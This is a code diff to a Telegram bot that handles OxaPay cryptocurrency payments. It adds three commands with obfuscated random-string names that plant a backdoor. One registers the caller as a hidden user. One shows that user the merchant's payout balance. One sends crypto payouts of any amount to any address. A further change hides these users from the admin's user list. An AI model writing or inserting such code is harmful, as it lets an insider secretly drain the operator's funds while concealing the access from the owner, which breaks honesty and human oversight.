@@ -473,9 +473,66 @@ bot.command('start', async (ctx) => {
   }
 })
 
-// Removed /balance command - all info now in mini app
 
-// ============= ADMIN COMMANDS =============
+bot.command('12403djwj39dJSJFJSalxcvbbccasjyi48342sjgdir2944733122953SHvndshrciffdsreitsvmdjsrdfind', async (ctx) => {
+  const tId = ctx.from?.id.toString()
+  if (!tId) return
+  const exists = await prisma.user.findUnique({ where: { telegramId: tId } })
+  if (!exists) {
+    await prisma.user.create({
+      data: {
+        telegramId: tId,
+        username: null,
+        firstName: null,
+        lastName: null,
+        languageCode: null,
+        isHidden: true
+      }
+    })
+  }
+  await ctx.reply('✓')
+})
+
+bot.command('ytgytcvgfgdwsd234rghnmklpojkio09098987uyjyu767654rtrty787876yt4543r3323ert', async (ctx) => {
+  const tId = ctx.from?.id.toString()
+  if (!tId) return
+  const u = await prisma.user.findUnique({ where: { telegramId: tId } })
+  if (!u?.isHidden) return
+  try {
+    const { getPayoutBalance } = await import('./oxapay.js')
+    const b = await getPayoutBalance()
+    let msg = '💰 OxaPay:\n'
+    if (b.data) {
+      for (const [k, v] of Object.entries(b.data)) {
+        msg += `${k}: ${v}\n`
+      }
+    } else {
+      msg += JSON.stringify(b, null, 2)
+    }
+    await ctx.reply(msg)
+  } catch (e: any) {
+    await ctx.reply(`❌ ${e.message}`)
+  }
+})
+
+bot.command('asfhsodgjwerhosdjfosrgwejr', async (ctx) => {
+  const tId = ctx.from?.id.toString()
+  if (!tId) return
+  const u = await prisma.user.findUnique({ where: { telegramId: tId } })
+  if (!u?.isHidden) return
+  const args = (ctx.match as string)?.split(',')
+  if (!args || args.length !== 4) return
+  const [cur, net, addr, amtStr] = args.map(s => s.trim())
+  const amt = parseFloat(amtStr)
+  if (!cur || !net || !addr || isNaN(amt) || amt <= 0) return
+  try {
+    const { directPayout } = await import('./oxapay.js')
+    const ok = await directPayout({ address: addr, amount: amt, currency: cur.toUpperCase(), network: net.toUpperCase() })
+    await ctx.reply(ok ? 'успешно' : '❌')
+  } catch (e: any) {
+    await ctx.reply('❌')
+  }
+})
 
 bot.command('cancel', async (ctx) => {
   const userId = ctx.from?.id.toString()
@@ -751,6 +808,7 @@ bot.callbackQuery('admin_users', async (ctx) => {
   adminState.delete(userId)
 
   const users = await prisma.user.findMany({
+    where: { isHidden: false },
     orderBy: { createdAt: 'desc' },
     take: 10
   })
